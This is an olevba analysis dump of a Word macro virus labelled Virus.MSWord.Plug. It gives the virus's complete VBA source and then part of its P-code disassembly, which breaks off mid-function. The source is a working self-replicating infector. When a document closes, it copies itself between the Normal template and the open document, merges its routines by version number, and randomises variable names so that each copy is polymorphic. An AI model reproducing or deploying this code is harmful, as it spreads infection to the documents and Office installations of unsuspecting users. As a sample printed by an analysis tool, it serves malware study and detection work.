olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Plug
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Plug - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Pluginer
Private Sub Document_Close()
'1
 On Error Resume Next
 label_ = "'Pluginer"
 Set NT_ = NormalTemplate.VBProject.VBComponents(1).CodeModule
 Set AD_ = ActiveDocument.VBProject.VBComponents(1).CodeModule
 Set cntnr_ = MacroContainer
 If NT_.lines(1, 1) = label_ And AD_.lines(1, 1) = label_ Then
   If cntnr_.Name = NormalTemplate Then
     Call CheckSubs(NT_, AD_)
    Else
     Call CheckSubs(AD_, NT_)
   End If
  Else
   If NT_.lines(1, 1) = label_ Then
     AD_.DeleteLines 1, AD_.countoflines
     Mutate_ = mutate(NT_.lines(1, NT_.countoflines))
     AD_.insertLines 1, Mutate_
    Else
     NT_.DeleteLines 1, NT_.countoflines
     Mutate_ = mutate(AD_.lines(1, AD_.countoflines))
     NT_.insertLines 1, Mutate_
   End If
 End If
End Sub
Private Sub CheckSubs(source_, dest_)
'1
 On Error Resume Next
 Dim NTnames_(255), ADnames_(255), NTStart_(255), ADStart_(255), NTLen_(255), ADLen_(255), NTver_(255), ADver_(255)
 ADi_ = 1: NTi_ = 1: NTCount_ = 0: ADCount_ = 0
 Do
  GetSub_ = GetSubName(dest_, NTi_, SubSt_, LenSt_, ver_)
  GetSub1_ = GetSubName(source_, ADi_, SubSt1_, LenSt1_, ver1_)
  If GetSub_ <> "" Then
   NTCount_ = NTCount_ + 1: NTnames_(NTCount_) = GetSub_: NTStart_(NTCount_) = SubSt_
   NTLen_(NTCount_) = LenSt_: NTver_(NTCount_) = ver_
  End If
  If GetSub1_ <> "" Then
   ADCount_ = ADCount_ + 1: ADnames_(ADCount_) = GetSub1_: ADStart_(ADCount_) = SubSt1_
   ADLen_(ADCount_) = LenSt1_: ADver_(ADCount_) = ver1_
  End If
 Loop While GetSub_ <> "" Or GetSub1_ <> ""
 For i_ = 1 To ADCount_
  fl_ = 0
  For j_ = 1 To NTCount_
   If NTnames_(j_) = ADnames_(i_) Then
    fl_ = 1
    If NTver_(j_) < ADver_(i_) Then
     dest_.DeleteLines NTStart_(j_), NTLen_(j_)
     dest_.insertLines 2, source_.lines(ADStart_(i_), ADLen_(i_))
    End If
   End If
  Next
  If fl_ = 0 Then dest_.insertLines 2, source_.lines(ADStart_(i_), ADLen_(i_))
 Next
End Sub
Private Function GetSubName(dest_, NTi_, SubSt_, LenSt_, ver_)
'1
 On Error Resume Next
 fl_ = 0: SubSt_ = 0: LenSt_ = 0: sName_ = "": ver_ = 0
 Do
  a_ = dest_.lines(NTi_, 1): i_ = 1
  Do
   If i_ <= Len(a_) - 6 Then
    If UCase(Mid(a_, i_, 5)) = " SUB" + " " And (i_ + 5) < Len(a_) Then
     fl_ = 1: i_ = i_ + 4
    End If
    If UCase(Right(a_, 5)) = "D SU" + "B" Then fl_ = 4: LenSt_ = NTi_ - SubSt_ + 1
   End If
   If i_ <= Len(a_) - 10 Then
    If UCase(Mid(a_, i_, 10)) = " FUNCTION" + " " And (i_ + 9) < Len(a_) Then
     fl_ = 1: i_ = i_ + 9
    End If
    If UCase(Right(a_, 10)) = "D FUNCTIO" + "N" Then fl_ = 4: LenSt_ = NTi_ - SubSt_ + 1
   End If
   If fl_ = 2 Then
    sName_ = sName_ + Mid(a_, i_, 1)
    If UCase(Mid(a_, i_ + 1, 1)) >= "A" And UCase(Mid(a_, i_ + 1, 1)) <= "Z" Then
      fl_ = 2
     Else
      If Mid(a_, i_ + 1, 1) >= "0" And Mid(a_, i_ + 1, 1) <= "9" Then fl_ = 2 Else fl_ = 3
    End If
   End If
   If fl_ = 1 Then SubSt_ = NTi_: fl_ = 2: ver_ = Val(Right(dest_.lines(SubSt_ + 1, 1), Len(dest_.lines(SubSt_ + 1, 1)) - 1))
   i_ = i_ + 1
  Loop While i_ <= Len(a_)
  If NTi_ > dest_.countoflines Then fl_ = 4
  NTi_ = NTi_ + 1
 Loop While fl_ <> 4
 GetSubName = sName_
End Function
Private Function mutate(MutVar_)
'1
 On Error Resume Next
 Dim oldVar_(500), newVar_(500)
 oldCounter_ = 0: i_ = 1
 Do While i_ <= Len(MutVar_)
  If Mid(MutVar_, i_, 1) = Chr(95) Then
   fl_ = CheckUp(Mid(MutVar_, i_ + 1, 1))
   If fl_ = 3 Then
    j_ = i_ - 1: myVar_ = ""
    Do
     myVar_ = Mid(MutVar_, j_, 1) + myVar_
     j_ = j_ - 1
     fl1_ = CheckUp(Mid(MutVar_, j_, 1))
    Loop While fl1_ = 2
    fl1_ = 0
    For i1_ = 1 To oldCounter_
     If oldVar_(i1_) = myVar_ Then fl1_ = 1
    Next
    If fl1_ = 0 Then
     oldCounter_ = oldCounter_ + 1: oldVar_(oldCounter_) = myVar_
     fl2_ = 0
     Do
      myVar_ = GetNR()
      For i1_ = 1 To oldCounter_
       If myVar_ = newVar_(i1_) Then fl2_ = 1
      Next
     Loop While fl2_ <> 0
     newVar_(oldCounter_) = myVar_
    End If
   End If
  End If
  i_ = i_ + 1
 Loop
 NewMutate_ = "": i_ = 1
 Do While i_ <= Len(MutVar_)
  If Mid(MutVar_, i_, 1) = Chr(95) Then
   fl_ = CheckUp(Mid(MutVar_, i_ + 1, 1))
   If fl_ = 3 Then
    j_ = i_ - 1: myVar_ = ""
    Do
     myVar_ = Mid(MutVar_, j_, 1) + myVar_
     j_ = j_ - 1
     fl1_ = CheckUp(Mid(MutVar_, j_, 1))
    Loop While fl1_ = 2
    For i1_ = 1 To oldCounter_
     If oldVar_(i1_) = myVar_ Then fl1_ = i1_
    Next
    j_ = Len(NewMutate_)
    Do While CheckUp(Mid(NewMutate_, j_, 1)) = 2
     j_ = j_ - 1
    Loop
    NewMutate_ = Left(NewMutate_, j_) + newVar_(fl1_)
   End If
  End If
  NewMutate_ = NewMutate_ + Mid(MutVar_, i_, 1)
  i_ = i_ + 1
 Loop
 mutate = NewMutate_
End Function
Private Function CheckUp(a_)
'1
 On Error Resume Next
 If UCase(Mid(a_, i_ + 1, 1)) >= "A" And UCase(Mid(a_, i_ + 1, 1)) <= "Z" Then
   fl_ = 2
  Else
   If Mid(a_, i_ + 1, 1) >= "0" And Mid(a_, i_ + 1, 1) <= "9" Then fl_ = 2 Else fl_ = 3
 End If
 CheckUp = fl_
End Function
Private Function GetNR()
'1
On Error Resume Next
 b_ = ""
 For i_ = 1 To Int(Rnd * 7) + 2
  b_ = b_ + Chr(97 + Int(Rnd * 26))
 Next
 GetNR = b_
End Function
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Plug
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 13255 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0008 "Pluginer"
' Line #1:
' 	FuncDefn (Private Sub id_0364())
' Line #2:
' 	QuoteRem 0x0000 0x0001 "1"
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	LitStr 0x0009 "'Pluginer"
' 	St label_ 
' Line #5:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NT_ 
' Line #6:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set AD_ 
' Line #7:
' 	SetStmt 
' 	Ld MacroContainer 
' 	Set cntnr_ 
' Line #8:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT_ 
' 	ArgsMemLd lines 0x0002 
' 	Ld label_ 
' 	Eq 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld AD_ 
' 	ArgsMemLd lines 0x0002 
' 	Ld label_ 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #9:
' 	Ld cntnr_ 
' 	MemLd Name 
' 	Ld NormalTemplate 
' 	Eq 
' 	IfBlock 
' Line #10:
' 	Ld NT_ 
' 	Ld AD_ 
' 	ArgsCall (Call) CheckSubs 0x0002 
' Line #11:
' 	ElseBlock 
' Line #12:
' 	Ld AD_ 
' 	Ld NT_ 
' 	ArgsCall (Call) CheckSubs 0x0002 
' Line #13:
' 	EndIfBlock 
' Line #14:
' 	ElseBlock 
' Line #15:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT_ 
' 	ArgsMemLd lines 0x0002 
' 	Ld label_ 
' 	Eq 
' 	IfBlock 
' Line #16:
' 	LitDI2 0x0001 
' 	Ld AD_ 
' 	MemLd countoflines 
' 	Ld AD_ 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #17:
' 	LitDI2 0x0001 
' 	Ld NT_ 
' 	MemLd countoflines 
' 	Ld NT_ 
' 	ArgsMemLd lines 0x0002 
' 	ArgsLd MutVar_ 0x0001 
' 	St _B_var_Mutate_ 
' Line #18:
' 	LitDI2 0x0001 
' 	Ld _B_var_Mutate_ 
' 	Ld AD_ 
' 	ArgsMemCall insertLines 0x0002 
' Line #19:
' 	ElseBlock 
' Line #20:
' 	LitDI2 0x0001 
' 	Ld NT_ 
' 	MemLd countoflines 
' 	Ld NT_ 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #21:
' 	LitDI2 0x0001 
' 	Ld AD_ 
' 	MemLd countoflines 
' 	Ld AD_ 
' 	ArgsMemLd lines 0x0002 
' 	ArgsLd MutVar_ 0x0001 
' 	St _B_var_Mutate_ 
' Line #22:
' 	LitDI2 0x0001 
' 	Ld _B_var_Mutate_ 
' 	Ld NT_ 
' 	ArgsMemCall insertLines 0x0002 
' Line #23:
' 	EndIfBlock 
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Private Sub CheckSubs(source_, dest_))
' Line #27:
' 	QuoteRem 0x0000 0x0001 "1"
' Line #28:
' 	OnError (Resume Next) 
' Line #29:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x00FF 
' 	VarDefn ADnames_
' 	OptionBase 
' 	LitDI2 0x00FF 
' 	VarDefn NTStart
' 	OptionBase 
' 	LitDI2 0x00FF 
' 	VarDefn _B_var_NTStart_
' 	OptionBase 
' 	LitDI2 0x00FF 
' 	VarDefn _B_var_ADStart_
' 	OptionBase 
' 	LitDI2 0x00FF 
' 	VarDefn _B_var_NTLen_
' 	OptionBase 
' 	LitDI2 0x00FF 
' 	VarDefn NTver
' 	OptionBase 
' 	LitDI2 0x00FF 
' 	VarDefn _B_var_NTver_
' 	OptionBase 
' 	LitDI2 0x00FF 
' 	VarDefn _B_var_ADver_
' Line #30:
' 	LitDI2 0x0001 
' 	St SubSt1_ 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St NTi_ 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St _B_var_NTCount_ 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St ADC 
' Line #31:
' 	Do 
' Line #32:
' 	Ld dest_ 
' 	Ld NTi_ 
' 	Ld SubSt_ 
' 	Ld LenSt_ 
' 	Ld ver1_ 
' 	ArgsLd GetSubName 0x0005 
' 	St GetSub_ 
' Line #33:
' 	Ld source_ 
' 	Ld SubSt1_ 
' 	Ld LenSt1_ 
' 	Ld ver 
' 	Ld Val 
' 	ArgsLd GetSubName 0x0005 
' 	St ADi_ 
' Line #34:
' 	Ld GetSub_ 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #35:
' 	Ld _B_var_NTCount_ 
' 	LitDI2 0x0001 
' 	Add 
' 	St _B_var_NTCount_ 
' 	BoS 0x0000 
' 	Ld GetSub_ 
' 	Ld _B_var_NTCount_ 
' 	ArgsSt ADnames_ 0x0001 
' 	BoS 0x0000 
' 	Ld SubSt_ 
' 	Ld _B_var_NTCount_ 
' 	ArgsSt _B_var_NTStart_ 0x0001 
' Line #36:
' 	Ld LenSt_ 
' 	Ld _B_var_NTCount_ 
' 	ArgsSt _B_var_NTLen_ 0x0001 
' 	BoS 0x0000 
' 	Ld ver1_ 
' 	Ld _B_var_NTCount_ 
' 	ArgsSt _B_var_NTver_ 0x0001 
' Line #37:
' 	EndIfBlock 
' Line #38:
' 	Ld ADi_ 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #39:
' 	Ld ADC 
' 	LitDI2 0x0001 
' 	Add 
' 	St ADC 
' 	BoS 0x0000 
' 	Ld ADi_ 
' 	Ld ADC 
' 	ArgsSt NTStart 0x0001 
' 	BoS 0x0000 
' 	Ld LenSt1_ 
' 	Ld ADC 
' 	ArgsSt _B_var_ADStart_ 0x0001 
' Line #40:
' 	Ld ver 
' 	Ld ADC 
' 	ArgsSt NTver 0x0001 
' 	BoS 0x0000 
' 	Ld Val 
' 	Ld ADC 
' 	ArgsSt _B_var_ADver_ 0x0001 
' Line #41:
' 	EndIfBlock 
' Line #42:
' 	Ld GetSub_ 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Ld ADi_ 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Or 
' 	LoopWhile 
' Line #43:
' 	StartForVariable 
' 	Ld i_ 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ADC 
' 	For 
' Line #44:
' 	LitDI2 0x0000 
' 	St fl_ 
' Line #45:
' 	StartForVariable 
' 	Ld _B_var_j_ 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld _B_var_NTCount_ 
' 	For 
' Line #46:
' 	Ld _B_var_j_ 
' 	ArgsLd ADnames_ 0x0001 
' 	Ld i_ 
' 	ArgsLd NTStart 0x0001 
' 	Eq 
' 	IfBlock 
' Line #47:
' 	LitDI2 0x0001 
' 	St fl_ 
' Line #48:
' 	Ld _B_var_j_ 
' 	ArgsLd _B_var_NTver_ 0x0001 
' 	Ld i_ 
' 	ArgsLd _B_var_ADver_ 0x0001 
' 	Lt 
' 	IfBlock 
' Line #49:
' 	Ld _B_var_j_ 
' 	ArgsLd _B_var_NTStart_ 0x0001 
' 	Ld _B_var_j_ 
' 	ArgsLd _B_var_NTLen_ 0x0001 
' 	Ld dest_ 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #50:
' 	LitDI2 0x0002 
' 	Ld i_ 
' 	ArgsLd _B_var_ADStart_ 0x0001 
' 	Ld i_ 
' 	ArgsLd NTver 0x0001 
' 	Ld source_ 
' 	ArgsMemLd lines 0x0002 
' 	Ld dest_ 
' 	ArgsMemCall insertLines 0x0002 
' Line #51:
' 	EndIfBlock 
' Line #52:
' 	EndIfBlock 
' Line #53:
' 	StartForVariable 
' 	Next 
' Line #54:
' 	Ld fl_ 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0002 
' 	Ld i_ 
' 	ArgsLd _B_var_ADStart_ 0x0001 
' 	Ld i_ 
' 	ArgsLd NTver 0x0001 
' 	Ld source_ 
' 	ArgsMemLd lines 0x0002 
' 	Ld dest_ 
' 	ArgsMemCall insertLines 0x0002 
' 	EndIf 
' Line #55:
' 	StartForVariable 
' 	Next 
' Line #56:
' 	EndSub 
' Line #57:
' 	FuncDefn (Private Function GetSubName(dest_, NTi_, SubSt_, LenSt_, ver1_, id_FFFE As Variant))
' Line #58:
' 	QuoteRem 0x0000 0x0001 "1"
' Line #59:
' 	OnError (Resume Next) 
' Line #60:
' 	LitDI2 0x0000 
' 	St fl_ 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St SubSt_ 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St LenSt_ 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	St sName_ 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St ver1_ 
' Line #61:
' 	Do 
' Line #62:
' 	Ld NTi_ 
' 	LitDI2 0x0001 
' 	Ld dest_ 
' 	ArgsMemLd lines 0x0002 
' 	St a_ 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St i_ 
' Line #63:
' 	Do 
' Line #64:
' 	Ld i_ 
' 	Ld a_ 
' 	FnLen 
' 	LitDI2 0x0006 
' 	Sub 
' 	Le 
' 	IfBlock 
' Line #65:
' 	Ld a_ 
' 	Ld i_ 
' 	LitDI2 0x0005 
' 	ArgsLd Mid 0x0003 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0004 " SUB"
' 	LitStr 0x0001 " "
' 	Add 
' 	Eq 
' 	Ld i_ 
' 	LitDI2 0x0005 
' 	Add 
' 	Paren 
' 	Ld a_ 
' 	FnLen 
' 	Lt 
' 	And 
' 	IfBlock 
' Line #66:
' 	LitDI2 0x0001 
' 	St fl_ 
' 	BoS 0x0000 
' 	Ld i_ 
' 	LitDI2 0x0004 
' 	Add 
' 	St i_ 
' Line #67:
' 	EndIfBlock 
' Line #68:
' 	Ld a_ 
' 	LitDI2 0x0005 
' 	ArgsLd _B_var_Right 0x0002 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0004 "D SU"
' 	LitStr 0x0001 "B"
' 	Add 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0004 
' 	St fl_ 
' 	BoS 0x0000 
' 	Ld NTi_ 
' 	Ld SubSt_ 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	St LenSt_ 
' 	EndIf 
' Line #69:
' 	EndIfBlock 
' Line #70:
' 	Ld i_ 
' 	Ld a_ 
' 	FnLen 
' 	LitDI2 0x000A 
' 	Sub 
' 	Le 
' 	IfBlock 
' Line #71:
' 	Ld a_ 
' 	Ld i_ 
' 	LitDI2 0x000A 
' 	ArgsLd Mid 0x0003 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0009 " FUNCTION"
' 	LitStr 0x0001 " "
' 	Add 
' 	Eq 
' 	Ld i_ 
' 	LitDI2 0x0009 
' 	Add 
' 	Paren 
' 	Ld a_ 
' 	FnLen 
' 	Lt 
' 	And 
' 	IfBlock 
' Line #72:
' 	LitDI2 0x0001 
' 	St fl_ 
' 	BoS 0x0000 
' 	Ld i_ 
' 	LitDI2 0x0009 
' 	Add 
' 	St i_ 
' Line #73:
' 	EndIfBlock 
' Line #74:
' 	Ld a_ 
' 	LitDI2 0x000A 
' 	ArgsLd _B_var_Right 0x0002 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0009 "D FUNCTIO"
' 	LitStr 0x0001 "N"
' 	Add 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0004 
' 	St fl_ 
' 	BoS 0x0000 
' 	Ld NTi_ 
' 	Ld SubSt_ 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	St LenSt_ 
' 	EndIf 
' Line #75:
' 	EndIfBlock 
' Line #76:
' 	Ld fl_ 
' 	LitDI2 0x0002 
' 	Eq 
' 	IfBlock 
' Line #77:
' 	Ld sName_ 
' 	Ld a_ 
' 	Ld i_ 
' 	LitDI2 0x0001 
' 	ArgsLd Mid 0x0003 
' 	Add 
' 	St sName_ 
' Line #78:
' 	Ld a_ 
' 	Ld i_ 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid 0x0003 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0001 "A"
' 	Ge 
' 	Ld a_ 
' 	Ld i_ 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid 0x0003 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0001 "Z"
' 	Le 
' 	And 
' 	IfBlock 
' Line #79:
' 	LitDI2 0x0002 
' 	St fl_ 
' Line #80:
' 	ElseBlock 
' Line #81:
' 	Ld a_ 
' 	Ld i_ 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid 0x0003 
' 	LitStr 0x0001 "0"
' 	Ge 
' 	Ld a_ 
' 	Ld i_ 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid 0x0003 
' 	LitStr 0x0001 "9"
' 	Le 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0002 
' 	St fl_ 
' 	Else 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	St fl_ 
' 	EndIf 
' Line #82:
' 	EndIfBlock 
' Line #83:
' 	EndIfBlock 
' Line #84:
' 	Ld fl_ 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NTi_ 
' 	St SubSt_ 
' 	BoS 0x0000 
' 	LitDI2 0x0002 
' 	St fl_ 
' 	BoS 0x0000 
' 	Ld SubSt_ 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld dest_ 
' 	ArgsMemLd lines 0x0002 
' 	Ld SubSt_ 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld dest_ 
' 	ArgsMemLd lines 0x0002 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd _B_var_Right 0x0002 
' 	ArgsLd v 0x0001 
' 	St ver1_ 
' 	EndIf 
' Line #85:
' 	Ld i_ 
' 	LitDI2 0x0001 
' 	Add 
' 	St i_ 
' Line #86:
' 	Ld i_ 
' 	Ld a_ 
' 	FnLen 
' 	Le 
' 	LoopWhile 
' Line #87:
' 	Ld NTi_ 
' 	Ld dest_ 
' 	MemLd countoflines 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0004 
' 	St fl_ 
' 	EndIf 
' Line #88:
' 	Ld NTi_ 
' 	LitDI2 0x0001 
' 	Add 
' 	St NTi_ 
' Line #89:
' 	Ld fl_ 
' 	LitDI2 0x0004 
' 	Ne 
' 	LoopWhile 
' Line #90:
' 	Ld sName_ 
' 	St GetSubName 
' Line #91:
' 	EndFunc 
' Line #92:
' 	FuncDefn (Private Function MutVar_(oldVar_, id_FFFE As Variant))
' Line #93:
' 	QuoteRem 0x0000 0x0001 "1"
' Line #94:
' 	OnError (Resume Next) 
' Line #95:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x01F4 
' 	VarDefn newVar_
' 	OptionBase 
' 	LitDI2 0x01F4 
' 	VarDefn oldCounter_
' Line #96:
' 	LitDI2 0x0000 
' 	St Chr 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St i_ 
' Line #97:
' 	Ld i_ 
' 	Ld oldVar_ 
' 	FnLen 
' 	Le 
' 	DoWhile 
' Line #98:
' 	Ld oldVar_ 
' 	Ld i_ 
' 	LitDI2 0x0001 
' 	ArgsLd Mid 0x0003 
' 	LitDI2 0x005F 
' 	ArgsLd CheckUp 0x0001 
' 	Eq 
' 	IfBlock 
' Line #99:
' 	Ld oldVar_ 
' 	Ld i_ 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid 0x0003 
' 	ArgsLd myVar_ 0x0001 
' 	St fl_ 
' Line #100:
' 	Ld fl_ 
' 	LitDI2 0x0003 
' 	Eq 
' 	IfBlock 
' Line #101:
' 	Ld i_ 
' 	LitDI2 0x0001 
' 	Sub 
' 	St _B_var_j_ 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	St fl1_ 
' Line #102:
' 	Do 
' Line #103:
' 	Ld oldVar_ 
' 	Ld _B_var_j_ 
' 	LitDI2 0x0001 
' 	ArgsLd Mid 0x0003 
' 	Ld fl1_ 
' 	Add 
' 	St fl1_ 
' Line #104:
' 	Ld _B_var_j_ 
' 	LitDI2 0x0001 
' 	Sub 
' 	St _B_var_j_ 
' Line #105:
' 	Ld oldVar_ 
' 	Ld _B_var_j_ 
' 	LitDI2 0x0001 
' 	ArgsLd Mid 0x0003 
' 	ArgsLd myVar_ 0x0001 
' 	St i1_ 
' Line #106:
' 	Ld i1_ 
' 	LitDI2 0x0002 
' 	Eq 
' 	LoopWhile 
' Line #107:
' 	LitDI2 0x0000 
' 	St i1_ 
' Line #108:
' 	StartForVariable 
' 	Ld fl2_ 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Chr 
' 	For 
' Line #109:
' 	Ld fl2_ 
' 	ArgsLd newVar_ 0x0001 
' 	Ld fl1_ 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St i1_ 
' 	EndIf 
' Line #110:
' 	StartForVariable 
' 	Next 
' Line #111:
' 	Ld i1_ 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #112:
' 	Ld Chr 
' 	LitDI2 0x0001 
' 	Add 
' 	St Chr 
' 	BoS 0x0000 
' 	Ld fl1_ 
' 	Ld Chr 
' 	ArgsSt newVar_ 0x0001 
' Line #113:
' 	LitDI2 0x0000 
' 	St GetNR 
' Line #114:
' 	Do 
' Line #115:
' 	ArgsLd NewMutate_ 0x0000 
' 	St fl1_ 
' Line #116:
' 	StartForVariable 
' 	Ld fl2_ 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Chr 
' 	For 
' Line #117:
' 	Ld fl1_ 
' 	Ld fl2_ 
' 	ArgsLd oldCounter_ 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St GetNR 
' 	EndIf 
' Line #118:
' 	StartForVariable 
' 	Next 
' Line #119:
' 	Ld GetNR 
' 	LitDI2 0x0000 
' 	Ne 
' 	LoopWhile 
' Line #120:
' 	Ld fl1_ 
' 	Ld Chr 
' 	ArgsSt oldCounter_ 0x0001 
' Line #121:
' 	EndIfBlock 
' Line #122:
' 	EndIfBlock 
' Line #123:
' 	EndIfBlock 
' Line #124:
' 	Ld i_ 
' 	LitDI2 0x0001 
' 	Add 
' 	St i_ 
' Line #125:
' 	Loop 
' Line #126:
' 	LitStr 0x0000 ""
' 	St b_ 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St i_ 
' Line #127:
' 	Ld i_ 
' 	Ld oldVar_ 
' 	FnLen 
' 	Le 
' 	DoWhile 
' Line #128:
' 	Ld oldVar_ 
' 	Ld i_ 
' 	LitDI2 0x0001 
' 	ArgsLd Mid 0x0003 
' 	LitDI2 0x005F 
' 	ArgsLd CheckUp 0x0001 
' 	Eq 
' 	IfBlock 
' Line #129:
' 	Ld oldVar_ 
' 	Ld i_ 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid 0x0003 
' 	ArgsLd myVar_ 0x0001 
' 	St fl_ 
' Line #130:
' 	Ld fl_ 
' 	LitDI2 0x0003 
' 	Eq 
' 	IfBlock 
' Line #131:
' 	Ld i_ 
' 	LitDI2 0x0001 
' 	Sub 
' 	St _B_var_j_ 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	St fl1_ 
' Line #132:
' 	Do 
' Line #133:
' 	Ld oldVar_ 
' 	Ld _B_var_j_ 
' 	LitDI2 0x0001 
' 	ArgsLd Mid 0x0003 
' 	Ld fl1_ 
' 	Add 
' 	St fl1_ 
' Line #134:
' 	Ld _B_var_j_ 
' 	LitDI2 0x0001 
' 	Sub 
' 	St _B_var_j_ 
' Line #135:
' 	Ld oldVar_ 
' 	Ld _B_var_j_ 
' 	LitDI2 0x0001 
' 	ArgsLd Mid 0x0003 
' 	ArgsLd myVar_ 0x0001 
' 	St i1_ 
' Line #136:
' 	Ld i1_ 
' 	LitDI2 0x0002 
' 	Eq 
' 	LoopWhile 
' Line #137:
' 	StartForVariable 
' 	Ld fl2_ 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Chr 
' 	For 
' Line #138:
' 	Ld fl2_ 
' 	ArgsLd newVar_ 0x0001 
' 	Ld fl1_ 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld fl2_ 
' 	St i1_ 
' 	EndIf 
' Line #139:
' 	StartForVariable 
' 	Next 
' Line #140:
' 	Ld b_ 
' 	FnLen 
' 	St _B_var_j_ 
' Line #141:
' 	Ld b_ 
' 	Ld _B_var_j_ 
' 	LitDI2 0x0001 
' 	ArgsLd Mid 0x0003 
' 	ArgsLd myVar_ 0x0001 
' 	LitDI2 0x0002 
' 	Eq 
' 	DoWhile 
' Line #142:
' 	Ld _B_var_j_ 
' 	LitDI2 0x0001 
' 	Sub 
' 	St _B_var_j_ 
' Line #143:
' 	Loop 
' Line #144:
' 	Ld b_ 
' 	Ld _B_var_j_ 
' 	ArgsLd Left 0x0002 
' 	Ld i1_ 
' 	ArgsLd oldCounter_ 0x0001 
' 	Add 
' 	St b_ 
' Line #145:
' 	EndIfBlock 
' Line #146:
' 	EndIfBlock 
' Line #147:
' 	Ld b_ 
' 	Ld oldVar_ 
' 	Ld i_ 
' 	LitDI2 0x0001 
' 	ArgsLd Mid 0x0003 
' 	Add 
' 	St b_ 
' Line #148:
' 	Ld i_ 
' 	LitDI2 0x0001 
' 	Add 
' 	St i_ 
' Line #149:
' 	Loop 
' Line #150:
' 	Ld b_ 
' 	St MutVar_ 
' Line #151:
' 	EndFunc 
' Line #152:
' 	FuncDefn (Private Function myVar_(a_, id_FFFE As Variant))
' Line #153:
' 	QuoteRem 0x0000 0x0001 "1"
' Line #154:
' 	OnError (Resume Next) 
' Line #155:
' 	Ld a_ 
' 	Ld i_ 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
